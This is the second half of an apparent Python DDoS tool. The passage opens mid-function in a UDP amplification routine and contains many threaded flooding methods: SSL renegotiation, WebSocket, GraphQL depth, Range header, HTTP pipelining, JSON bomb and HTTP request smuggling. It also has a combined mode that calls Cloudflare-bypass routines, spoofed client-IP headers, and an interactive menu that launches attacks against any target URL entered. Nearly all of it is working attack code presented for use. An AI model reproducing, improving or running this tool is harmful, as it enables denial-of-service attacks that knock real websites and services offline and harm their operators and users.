                    amp = random.choice(amplifiers.get(amp_type, amplifiers["dns"]))
                    if amp_type == "dns":
                        query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                        query += b'\x03www\x07' + target_host.encode() + b'\x00\x00\x01\x00\x01'
                        sock.sendto(query, (amp, 53))
                    else:
                        ntp_packet = b'\x17\x00\x03\x2a' + b'\x00' * 44
                        sock.sendto(ntp_packet, (amp, 123))
                    update_stats(sent=1, method="udp_amp")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def ssl_renegotiation(target_host, target_port=443, threads=2000):
        """SSL Renegotiation attack"""
        def worker():
            while not stop_attack.is_set():
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
                    ssl_sock.connect((target_host, target_port))
                    
                    for _ in range(100):
                        ssl_sock.send(b'R' * 65535)
                        update_stats(sent=1, bytes_sent=65535, method="ssl_reneg")
                    
                    ssl_sock.close()
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def websocket_flood(target_ws_url, threads=2000):
        """WebSocket persistent connection flood"""
        def worker():
            while not stop_attack.is_set():
                try:
                    import websocket
                    ws = websocket.WebSocket()
                    ws.connect(target_ws_url, timeout=5)
                    for _ in range(1000):
                        ws.send('X' * 10000)
                        update_stats(sent=1, bytes_sent=10000, method="websocket")
                    ws.close()
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def graphql_depth(target_url, threads=2000):
        """GraphQL depth attack"""
        depth_payload = "query { " + " ".join([f"f{i}: __typename" for i in range(500)]) + " }"
        
        def worker():
            while not stop_attack.is_set():
                try:
                    requests.post(
                        target_url + "/graphql",
                        json={"query": depth_payload * 50},
                        headers=get_random_headers(),
                        timeout=3
                    )
                    update_stats(sent=1, method="graphql")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def range_dos(target_url, threads=3000):
        """Range header DoS (CVE-2018-6389)"""
        def worker():
            while not stop_attack.is_set():
                try:
                    headers = get_random_headers()
                    ranges = [f"bytes={i}-{i+99}" for i in range(0, 100000, 100)]
                    headers['Range'] = ', '.join(ranges[:100])
                    requests.get(target_url, headers=headers, timeout=5)
                    update_stats(sent=1, method="range_dos")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def http_pipeline(target_host, target_port=80, threads=3000):
        """HTTP pipeline flood"""
        def worker():
            while not stop_attack.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((target_host, target_port))
                    
                    pipeline = ""
                    for i in range(500):
                        pipeline += f"GET /{i} HTTP/1.1\r\nHost: {target_host}\r\n\r\n"
                    
                    sock.send(pipeline.encode())
                    update_stats(sent=500, method="pipeline")
                    sock.close()
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def json_bomb(target_url, threads=1500):
        """JSON deserialization bomb"""
        def create_deep_json(depth=5000):
            obj = {}
            current = obj
            for i in range(depth):
                current[i] = {}
                current = current[i]
            return json.dumps(obj)
        
        bomb = create_deep_json(5000)
        
        def worker():
            while not stop_attack.is_set():
                try:
                    requests.post(target_url, json={"data": bomb}, headers=get_random_headers(), timeout=5)
                    update_stats(sent=1, method="json_bomb")
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def http_smuggling(target_host, target_port=80, threads=2000):
        """HTTP request smuggling"""
        def worker():
            while not stop_attack.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((target_host, target_port))
                    payload = f"POST /admin HTTP/1.1\r\nHost: {target_host}\r\nContent-Length: 50\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {target_host}\r\n\r\n"
                    sock.send(payload.encode())
                    update_stats(sent=1, method="smuggling")
                    sock.close()
                except:
                    update_stats(error=True)
        
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    @staticmethod
    def all_methods_combined(target_url, target_host, target_port):
        """All methods combined for maximum pressure"""
        methods_to_run = [
            (AttackMethods.http2_rapid_reset, (target_url, 300)),
            (AttackMethods.websocket_flood, (target_url.replace('http', 'ws'), 200)),
            (AttackMethods.graphql_depth, (target_url, 200)),
            (AttackMethods.syn_flood, (target_host, target_port, 1000)),
            (AttackMethods.udp_amplification, (target_host, "dns", 500)),
            (AttackMethods.ssl_renegotiation, (target_host, target_port, 300)),
            (AttackMethods.slowloris_advanced, (target_host, target_port, 500)),
            (AttackMethods.range_dos, (target_url, 300)),
            (AttackMethods.http_pipeline, (target_host, target_port, 300)),
            (AttackMethods.json_bomb, (target_url, 200)),
            (CloudflareL3L4Bypass.ip_spoofing_flood, (target_host, target_port, 1000)),
            (CloudflareL7Bypass.curl_cffi_impersonate, (target_url, 200)),
        ]
        
        for method, args in methods_to_run:
            try:
                threading.Thread(target=method, args=args, daemon=True).start()
            except:
                pass

# ================================ GLOBAL FUNCTIONS ================================

stats = {
    "requests_sent": 0,
    "bytes_sent": 0,
    "errors": 0,
    "start_time": None,
    "methods_used": defaultdict(int)
}
stats_lock = threading.Lock()
stop_attack = threading.Event()
user_agents = []

def get_random_ua():
    return random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def get_random_headers(host=None):
    headers = {
        'User-Agent': get_random_ua(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'X-Forwarded-For': get_random_ip(),
        'X-Real-IP': get_random_ip(),
        'True-Client-IP': get_random_ip(),
        'CF-Connecting-IP': get_random_ip(),
    }
    if host:
        headers['Host'] = host
    return headers

def update_stats(sent=0, bytes_sent=0, error=False, method=None):
    with stats_lock:
        stats["requests_sent"] += sent
        stats["bytes_sent"] += bytes_sent
        if error:
            stats["errors"] += 1
        if method:
            stats["methods_used"][method] += sent

def status_printer():
    while not stop_attack.is_set():
        if stats["start_time"]:
            elapsed = int(time.time() - stats["start_time"])
            elapsed_str = f"{elapsed // 3600:02d}:{(elapsed % 3600) // 60:02d}:{elapsed % 60:02d}"
            req_per_sec = stats["requests_sent"] / max(1, elapsed)
        else:
            elapsed_str = "00:00:00"
            req_per_sec = 0
        
        sys.stdout.write(f"\r{Fore.CYAN}[⏱️] {elapsed_str} | "
                        f"📊 Req: {stats['requests_sent']:,} ({req_per_sec:.0f}/s) | "
                        f"💾 Data: {stats['bytes_sent']/1024/1024:.2f} MB | "
                        f"❌ Err: {stats['errors']:,} | "
                        f"🧵 Thr: {threading.active_count()}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.5)

def load_user_agents():
    global user_agents
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    ]

# ================================ MAIN FUNCTION ================================

def main():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    print(BANNER)
    
    load_user_agents()
    
    # Target input
    print(f"{Fore.YELLOW}[?] Target URL (https://example.com):{Style.RESET_ALL}")
    target_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
    
    if not target_input.startswith(('http://', 'https://')):
        target_input = 'https://' + target_input
    
    parsed = urlparse(target_input)
    target_host = parsed.netloc.split(':')[0]
    target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    target_url = f"{parsed.scheme}://{target_host}:{target_port}{parsed.path or '/'}"
    
    print(f"\n{Fore.CYAN}[+] Target: {target_url}")
    print(f"[+] Host: {target_host} | Port: {target_port}{Style.RESET_ALL}\n")
    
    # Mode selection
    print(f"{Fore.MAGENTA}{Style.BRIGHT}{'='*50}")
    print(f"[!] SELECT MODE:")
    print(f"    1. AUTO DDOS (GACOR! - Recommended)")
    print(f"    2. MANUAL (Pilih metode sendiri)")
    print(f"{'='*50}{Style.RESET_ALL}")
    
    mode_choice = input(f"{Fore.GREEN}└─> (1/2): {Style.RESET_ALL}").strip()
    
    if mode_choice == "1" or mode_choice.lower() == "auto":
        # AUTO DDOS MODE - GACOR!
        print(f"\n{Fore.GREEN}{Style.BRIGHT}[!!!] AUTO DDOS MODE ACTIVATED - GACOR! [!!!]{Style.RESET_ALL}\n")
        
        # Run auto-detection
        detector = AutoDetectionEngine(target_url, target_host, target_port)
        recommendations = detector.full_scan()
        
        if not recommendations:
            print(f"{Fore.RED}[!] No recommendations generated, using default ALL METHODS{Style.RESET_ALL}")
            method_choice = "30"
            threads = 3000
            duration = 90
        else:
            # Use top recommendation
            best = recommendations[0]
            print(f"{Fore.GREEN}[+] Using SMART recommendation:{Style.RESET_ALL}")
            print(f"    Method: {best['method_name']}")
            print(f"    Threads: {best['threads']}")
            print(f"    Duration: {best['duration']}s")
            print()
            
            confirm = input(f"{Fore.YELLOW}[?] Use this recommendation? (Enter for yes, n for custom):{Style.RESET_ALL} ").strip().lower()
            
            if confirm == 'n':
                print(f"{Fore.YELLOW}[?] Enter threads (default {best['threads']}):{Style.RESET_ALL}")
                threads_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
                threads = int(threads_input) if threads_input.isdigit() else best['threads']
                
                print(f"{Fore.YELLOW}[?] Enter duration seconds (0=infinite):{Style.RESET_ALL}")
                duration_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
                duration = int(duration_input) if duration_input.isdigit() else best['duration']
                
                method_choice = str(best['method_id'])
            else:
                method_choice = str(best['method_id'])
                threads = best['threads']
                duration = best['duration']
            
            # Check if we need to use origin direct attack
            if 'target_override' in best:
                target_host = best['target_override']
                print(f"{Fore.GREEN}[+] Using origin IP direct: {target_host}{Style.RESET_ALL}")
    
    else:
        # MANUAL MODE
        print(f"\n{Fore.YELLOW}[+] Available Attack Methods:{Style.RESET_ALL}")
        methods_list = [
            ("1", "HTTP/2 Rapid Reset"),
            ("2", "Slowloris Advanced"),
            ("3", "SYN Flood (L3/L4 Bypass)"),
            ("4", "UDP Amplification"),
            ("5", "SSL Renegotiation"),
            ("6", "WebSocket Flood"),
            ("7", "GraphQL Depth"),
            ("8", "Range Header DoS"),
            ("9", "HTTP Pipeline"),
            ("10", "JSON Bomb"),
            ("11", "HTTP Smuggling"),
            ("12", "IP Spoofing (L3)"),
            ("13", "Port Hopping (L4)"),
            ("14", "Fragmentation Attack"),
            ("15", "curl_cffi Impersonate (L7)"),
            ("16", "FlareSolverr Bypass"),
            ("17", "ACME Path Bypass"),
            ("18", "Origin Direct Attack"),
            ("30", "ALL METHODS COMBINED")
        ]
        
        for i in range(0, len(methods_list), 3):
            line = ""
            for j in range(3):
                if i+j < len(methods_list):
                    line += f"  {Fore.GREEN}{methods_list[i+j][0]}{Style.RESET_ALL}. {methods_list[i+j][1][:25]:<25}"
            print(line)
        
        method_choice = input(f"\n{Fore.GREEN}[?] Select method (1-30):{Style.RESET_ALL} ").strip()
        
        print(f"{Fore.YELLOW}[?] Number of threads (default 2000):{Style.RESET_ALL}")
        threads_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
        threads = int(threads_input) if threads_input.isdigit() else 2000
        
        print(f"{Fore.YELLOW}[?] Duration seconds (0=infinite):{Style.RESET_ALL}")
        duration_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
        duration = int(duration_input) if duration_input.isdigit() else 0
    
    # Execute attack
    print(f"\n{Fore.RED}{Style.BRIGHT}[!!!] LAUNCHING ATTACK - PRESS CTRL+C TO STOP [!!!]{Style.RESET_ALL}\n")
    
    stats["start_time"] = time.time()
    threading.Thread(target=status_printer, daemon=True).start()
    
    # Method mapping
    method_map = {
        "1": lambda: AttackMethods.http2_rapid_reset(target_url, threads),
        "2": lambda: AttackMethods.slowloris_advanced(target_host, target_port, threads),
        "3": lambda: AttackMethods.syn_flood(target_host, target_port, threads),
        "4": lambda: AttackMethods.udp_amplification(target_host, "dns", threads),
        "5": lambda: AttackMethods.ssl_renegotiation(target_host, target_port, threads),
        "6": lambda: AttackMethods.websocket_flood(target_url.replace('http', 'ws'), threads),
        "7": lambda: AttackMethods.graphql_depth(target_url, threads),
        "8": lambda: AttackMethods.range_dos(target_url, threads),
        "9": lambda: AttackMethods.http_pipeline(target_host, target_port, threads),
        "10": lambda: AttackMethods.json_bomb(target_url, threads),
        "11": lambda: AttackMethods.http_smuggling(target_host, target_port, threads),
        "12": lambda: CloudflareL3L4Bypass.ip_spoofing_flood(target_host, target_port, threads),
        "13": lambda: CloudflareL3L4Bypass.port_hopping_flood(target_host, target_port, threads),
        "14": lambda: CloudflareL3L4Bypass.fragmentation_attack(target_host, target_port, threads),
        "15": lambda: CloudflareL7Bypass.curl_cffi_impersonate(target_url, threads),
        "16": lambda: CloudflareL7Bypass.flare_solverr_bypass(target_url, threads=min(500, threads)),
        "17": lambda: CloudflareL7Bypass.acme_path_bypass(target_url, threads),
        "18": lambda: CloudflareL7Bypass.origin_direct_attack(target_host, target_port, threads),
        "30": lambda: AttackMethods.all_methods_combined(target_url, target_host, target_port),
    }
    
    if method_choice in method_map:
        method_map[method_choice]()
    else:
        print(f"{Fore.RED}[!] Invalid method, using ALL METHODS{Style.RESET_ALL}")
        AttackMethods.all_methods_combined(target_url, target_host, target_port)
    
    if duration > 0:
        time.sleep(duration)
        stop_attack.set()
    else:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            stop_attack.set()
    
    print(f"\n\n{Fore.YELLOW}[+] Attack finished.{Style.RESET_ALL}")
    print(f"{Fore.CYAN}    Total Requests: {stats['requests_sent']:,}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}    Total Data: {stats['bytes_sent']/1024/1024:.2f} MB{Style.RESET_ALL}")
    print(f"{Fore.CYAN}    Errors: {stats['errors']:,}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()